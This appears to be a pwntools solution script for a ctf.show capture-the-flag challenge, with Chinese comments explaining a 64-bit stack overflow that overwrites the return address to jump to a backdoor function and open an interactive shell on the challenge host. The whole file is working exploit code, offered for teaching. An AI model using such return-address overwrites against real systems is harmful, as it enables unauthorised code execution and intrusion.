from pwn import *
from LibcSearcher import *
from ctypes import c_uint

context(arch = "amd64", os = 'linux', log_level = 'debug')

io = remote('pwn.challenge.ctf.show', 28187)
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

# backdoor = 0x400697：backdoor函数的地址
backdoor = 0x400697

# offset = 0x80 + 8：计算64位程序的栈溢出偏移量
# 0x80：缓冲区到saved rbp的距离
# 8：saved rbp的大小（64位程序）
offset = 0x80 + 8

# payload = b'a' * offset + p64(backdoor)：构造攻击载荷
# 填充垃圾数据到返回地址位置，然后覆盖返回地址为backdoor函数地址
payload = b'a' * offset + p64(backdoor)

io.sendline(payload)
io.interactive()

"""
【知识点讲解】
1. 题目类型：stack overflow - 64位栈溢出
2. 核心原理：
   - 利用栈溢出漏洞覆盖返回地址
   - 直接跳转到程序中已有的backdoor函数
3. 关键计算：
   - offset = 0x80 + 8：计算到返回地址的偏移量
   - 0x80是缓冲区大小，8是rbp的大小
4. 执行流程：
   - 构造payload，填充垃圾数据到返回地址
   - 覆盖返回地址为backdoor函数地址
   - 程序执行ret指令时跳转到backdoor函数
5. 技术要点：
   - 64位程序的栈溢出利用
   - 准确计算偏移量
   - 直接利用程序中的backdoor函数
"""
